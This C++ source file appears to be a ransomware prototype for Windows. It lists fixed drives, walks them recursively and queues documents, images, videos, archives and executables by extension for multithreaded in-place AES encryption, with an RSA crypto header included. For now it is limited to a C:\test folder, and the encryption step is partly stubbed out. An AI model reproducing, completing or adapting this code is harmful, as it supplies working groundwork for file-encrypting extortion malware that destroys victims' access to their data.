
#include <cstdlib>
#include <iostream>
#include <vector>
#include <set>
#include <fstream>

#include <boost\filesystem.hpp>

#include <windows.h>

#include "concurrentqueue.h"
#include "AESCrypto.h"
#include "RSACrypto.h"

using namespace std;
using namespace boost::filesystem;

struct producer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& flag;
};

struct consumer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
};

set<wstring>* get_wanted_extentions();
set<wstring>* get_ignore_folders();
vector<wstring>* get_available_drives();

void produce(producer_bundle& bundle);
void consume(consumer_bundle& bundle, const int& consumer_id);

int main(int argc, char* argv[]) {
	AESCrypto *aes = new AESCrypto();
	unsigned char tag[16];
	/*std::ifstream in_enc(L"C:\\test\\test.jpg", ios::binary);
	std::ofstream out_enc(L"C:\\test\\test.enc", ios::binary);

	std::ifstream in_dec(L"C:\\test\\test.enc", ios::binary);
	std::ofstream out_dec(L"C:\\test\\testdec.jpg", ios::binary);
	aes->encrypt(in_enc, out_enc, tag);
	aes->decrypt(in_dec, out_dec, tag);*/
	std::fstream file_enc(L"C:\\test\\test.txt", ios::binary | ios::in | ios::out);
	wstring path = L"C:\\test\\test.txt";
	aes->in_place_encrypt(path, tag);


	moodycamel::ConcurrentQueue<wstring> queue;
	moodycamel::ProducerToken ptok(queue);
	const int producer_count = 1;
	const int consumer_count = 4;
	thread producers[producer_count];
	thread consumers[consumer_count];
	atomic<int> doneProducer(0);
	atomic<int> doneComsumer(0);

	producer_bundle producer_bundle = {queue, ptok, doneProducer};

	producers[0] = thread(bind(&produce, ref(producer_bundle)));

	consumer_bundle consumer_bundle = { queue, ptok, doneProducer, doneComsumer, producer_count, consumer_count };
	// Start consumer threads
	for (int i = 0; i < consumer_count; ++i) {
		consumers[i] = thread(bind(&consume, ref(consumer_bundle), i));
	}

	producers[0].join();

	for (int i = 0; i < consumer_count; ++i) {
		consumers[i].join();
	}

	system("pause");
	return 0;
}

set<wstring>* get_wanted_extentions() {
	set<wstring>* extentions = new set<wstring>();

	extentions->insert(L".pdf");
	extentions->insert(L".doc");
	extentions->insert(L".docx");
	extentions->insert(L".txt");
	extentions->insert(L".xls");
	extentions->insert(L".csv");

	extentions->insert(L".jpg");
	extentions->insert(L".jpeg");
	extentions->insert(L".png");
	extentions->insert(L".gif");

	extentions->insert(L".webm");
	extentions->insert(L".mkv");
	extentions->insert(L".avi");
	extentions->insert(L".flv");
	extentions->insert(L".mp4");
	extentions->insert(L".wmv");
	extentions->insert(L".mpg");
	extentions->insert(L".mpeg");

	extentions->insert(L".tar");
	extentions->insert(L".gz");
	extentions->insert(L".zip");
	extentions->insert(L".7z");
	extentions->insert(L".rar");

	extentions->insert(L".exe");
	extentions->insert(L".msi");
	extentions->insert(L".bin");
	extentions->insert(L".iso");

	return extentions;
}

vector<wstring>* get_available_drives() {

	vector<wstring>* drives = new vector<wstring>();

	WCHAR myDrives[105];
	UINT driveType;

	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
	{
		wprintf(L"GetLogicalDrives() failed with error code: %lu \n", GetLastError());
	}
	else
	{
		wprintf(L"This machine has the following logical drives: \n");

		for (LPWSTR drive = myDrives; *drive != 0; drive += 4)
		{
			driveType = GetDriveTypeW(drive);
			wprintf(L"Drive %s is type %d \n", drive, driveType);

			if (driveType == DRIVE_FIXED) {
				wstring drive_string(drive);
				drives->push_back(drive_string);
			}
		}
	}

	return drives;
}


set<wstring>* get_ignore_folders() {
	set<wstring>* ignore_folders = new set<wstring>();

	ignore_folders->insert(L"boost_");
	ignore_folders->insert(L"OpenSSL");
	ignore_folders->insert(L"Perl");
	ignore_folders->insert(L"$");

	return ignore_folders;
}

void produce(producer_bundle& bundle) {
	//cout << "PRODUCER 1 - Started" << endl;

	set<wstring>* ignore_folders = get_ignore_folders();
	set<wstring>* wanted_extentions = get_wanted_extentions();
	vector<wstring>* drives = get_available_drives();

	moodycamel::ConcurrentQueue<wstring>& queue = bundle.q;
	moodycamel::ProducerToken& ptok = bundle.p;
	atomic<int>& flag = bundle.flag;

	/*cout << "Looking for files to encrypt with the following extentions:" << endl;
	for (wstring s : *wanted_extentions) {
		wcout << L"\t- " << s << endl;
	}*/

	// Testing
	drives = new vector<wstring>();
	drives->push_back(L"C:\\test");

	// Try searching for data on all drives
	for (wstring drive : *drives) {
		
		recursive_directory_iterator dir(drive), end;
		while (dir != end) {
			try
			{
				if (is_directory(dir->path())) {
					// Exclude certain paths 
					for (wstring partial_folder_name : *ignore_folders) {
						if (dir->path().wstring().find(partial_folder_name) != string::npos) {
							// Don't iterate further into folder
							dir.no_push();
							// cout << "Excluding -> " << dir->path() << endl;
							break;
						}
					}
				}

				if (is_regular_file(dir->path())) {
					// Only gather files with particular extentions
					if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
						wprintf(L"PRODUCER 1 - Queueing %s \n", &(dir->path().wstring())[0]);
						queue.enqueue(ptok, dir->path().wstring());
					}
				}

				++dir;
			}
			catch (const filesystem_error& ex)
			{
				cout << "PROBLEM PATH - " << dir->path() << endl;
				cout << ex.what() << '\n';
			}
		}
	}
	// Notify we are done producing
	flag.fetch_add(1, memory_order_release);
}

void consume(consumer_bundle& bundle, const int& consumer_id) {
	//cout << "CONSUMER " << consumer_id << " - Started" << endl;
	moodycamel::ConcurrentQueue<wstring>& queue = bundle.q;
	moodycamel::ProducerToken& ptok = bundle.p;

	atomic<int>& doneProducer = bundle.prod_flag;
	atomic<int>& doneConsumer = bundle.cons_flag;

	const int& producer_count = bundle.producer_count;
	const int& consumer_count = bundle.consumer_count;

	// Consume paths from producer thread for encryption
	wstring path_str;
	bool items_left;
	do {
		items_left = doneProducer.load(memory_order_acquire) != producer_count;
		while (queue.try_dequeue_from_producer(ptok, path_str)) {
			items_left = true;
			wprintf(L"CONSUMER %d - Consuming %s \n",consumer_id,  &path_str[0]);
		}
	} while (items_left || doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == consumer_count);
}